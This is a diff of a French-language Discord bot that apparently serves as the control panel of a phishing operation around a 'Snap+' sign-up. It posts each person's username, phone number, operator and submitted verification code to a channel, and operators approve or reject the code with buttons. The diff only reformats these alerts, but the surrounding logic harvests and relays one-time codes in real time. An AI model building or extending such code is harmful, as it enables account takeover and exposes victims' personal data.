@@ -25,30 +25,17 @@ client.on('interactionCreate', async interaction => {
         
         const embed = new EmbedBuilder()
             .setColor('#2ecc71')
-            .setTitle('✅ Code validé')
-            .addFields(
-                { 
-                    name: '👤 Nom d\'utilisateur', 
-                    value: username, 
-                    inline: false 
-                },
-                { 
-                    name: '📞 Téléphone', 
-                    value: formatPhoneNumber(user.phone), 
-                    inline: false 
-                },
-                { 
-                    name: '🔢 Code', 
-                    value: `\`${user.submittedCode}\``, 
-                    inline: false 
-                },
-                { 
-                    name: '📅 Validé à', 
-                    value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), 
-                    inline: false 
-                }
-            )
-            .setFooter({ text: 'Utilisateur vérifié' });
+            .setDescription(
+                `@everyone\n` +
+                `# ✅ Code validé\n` +
+                `${SEPARATOR}\n` +
+                `## 👤 **Nom d'utilisateur:** ${username}\n` +
+                `## 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+                `## 🔢 **Code:** \`${user.submittedCode}\`\n` +
+                `## 📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+                `${SEPARATOR}\n` +
+                `*Utilisateur vérifié*`
+            );
         
         await interaction.update({ 
             content: '@everyone', 
@@ -64,30 +51,17 @@ client.on('interactionCreate', async interaction => {
         
         const embed = new EmbedBuilder()
             .setColor('#e74c3c')
-            .setTitle('🔒 Code rejeté')
-            .addFields(
-                { 
-                    name: '👤 Nom d\'utilisateur', 
-                    value: username, 
-                    inline: false 
-                },
-                { 
-                    name: '🔢 Code saisi', 
-                    value: `\`${rejectedCode || 'N/A'}\``, 
-                    inline: false 
-                },
-                { 
-                    name: '📞 Téléphone', 
-                    value: formatPhoneNumber(user.phone), 
-                    inline: false 
-                },
-                { 
-                    name: '📅 Rejeté à', 
-                    value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), 
-                    inline: false 
-                }
-            )
-            .setFooter({ text: 'L\'utilisateur devra ressaisir le code' });
+            .setDescription(
+                `@everyone\n` +
+                `# 🔒 Code rejeté\n` +
+                `${SEPARATOR}\n` +
+                `## 👤 **Nom d'utilisateur:** ${username}\n` +
+                `## 🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
+                `## 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+                `## 📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+                `${SEPARATOR}\n` +
+                `*L'utilisateur devra ressaisir le code*`
+            );
         
         await interaction.update({ 
             content: '@everyone', 
@@ -108,30 +82,17 @@ async function sendInitialEmbed(username, phone) {
     
     const embed = new EmbedBuilder()
         .setColor('#2b2d31')
-        .setTitle('📱 Nouvelle inscription Snap+')
-        .addFields(
-            { 
-                name: '👤 Nom d\'utilisateur', 
-                value: username, 
-                inline: false 
-            },
-            { 
-                name: '📞 Téléphone', 
-                value: formatPhoneNumber(phone), 
-                inline: false 
-            },
-            { 
-                name: '🏛️ Opérateur', 
-                value: user.operator || 'N/A', 
-                inline: false 
-            },
-            { 
-                name: '⏰ Date', 
-                value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), 
-                inline: false 
-            }
-        )
-        .setFooter({ text: 'En attente du code...' });
+        .setDescription(
+            `@everyone\n` +
+            `# 📱 Nouvelle inscription Snap+\n` +
+            `${SEPARATOR}\n` +
+            `## 👤 **Nom d'utilisateur:** ${username}\n` +
+            `## 📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
+            `## 🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
+            `## ⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+            `${SEPARATOR}\n` +
+            `*En attente du code...*`
+        );
     
     await channel.send({ 
         content: '@everyone',
@@ -145,30 +106,17 @@ async function sendCodeEmbed(username) {
     
     const embed = new EmbedBuilder()
         .setColor('#f1c40f')
-        .setTitle('🔒 Code de vérification soumis')
-        .addFields(
-            { 
-                name: '👤 Nom d\'utilisateur', 
-                value: username, 
-                inline: false 
-            },
-            { 
-                name: '🔢 Code saisi', 
-                value: `\`${user.submittedCode}\``, 
-                inline: false 
-            },
-            { 
-                name: '📞 Téléphone', 
-                value: formatPhoneNumber(user.phone), 
-                inline: false 
-            },
-            { 
-                name: '📅 Soumis à', 
-                value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), 
-                inline: false 
-            }
-        )
-        .setFooter({ text: 'En attente de validation par un modérateur' });
+        .setDescription(
+            `@everyone\n` +
+            `# 🔒 Code de vérification soumis\n` +
+            `${SEPARATOR}\n` +
+            `## 👤 **Nom d'utilisateur:** ${username}\n` +
+            `## 🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
+            `## 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+            `## 📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+            `${SEPARATOR}\n` +
+            `*En attente de validation par un modérateur*`
+        );
     
     const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`accept:${username}`).setLabel('Accepter').setStyle(ButtonStyle.Success),
